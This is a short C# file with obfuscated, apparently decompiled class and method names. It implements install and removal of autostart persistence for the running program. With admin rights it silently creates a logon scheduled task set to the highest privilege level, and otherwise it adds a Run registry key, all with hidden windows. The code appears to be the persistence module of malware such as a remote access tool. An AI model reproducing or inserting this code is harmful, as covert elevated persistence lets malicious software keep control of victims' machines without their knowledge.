using System;
using System.Diagnostics;
using Microsoft.Win32;

public static class GClass38
{
	public static bool smethod_0()
	{
		if (GClass41.smethod_1() == "Admin")
		{
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks");
				processStartInfo.Arguments = "/create /tn \"" + GClass0.string_8 + "\" /sc ONLOGON /tr \"" + GClass53.CurrentPath + "\" /rl HIGHEST /f";
				processStartInfo.UseShellExecute = false;
				processStartInfo.CreateNoWindow = true;
				Process? process = Process.Start(processStartInfo);
				process!.WaitForExit(1000);
				if (process!.ExitCode == 0)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
			return GClass47.smethod_0(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", GClass0.string_8, GClass53.CurrentPath, addQuotes: true);
		}
		return GClass47.smethod_0(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", GClass0.string_8, GClass53.CurrentPath, addQuotes: true);
	}

	public static bool smethod_1()
	{
		if (GClass41.smethod_1() == "Admin")
		{
			try
			{
				Process? process = Process.Start(new ProcessStartInfo("schtasks")
				{
					Arguments = "/delete /tn \"" + GClass0.string_8 + "\" /f",
					UseShellExecute = false,
					CreateNoWindow = true
				});
				process!.WaitForExit(1000);
				if (process!.ExitCode == 0)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
			return GClass47.smethod_2(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", GClass0.string_8);
		}
		return GClass47.smethod_2(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", GClass0.string_8);
	}
}
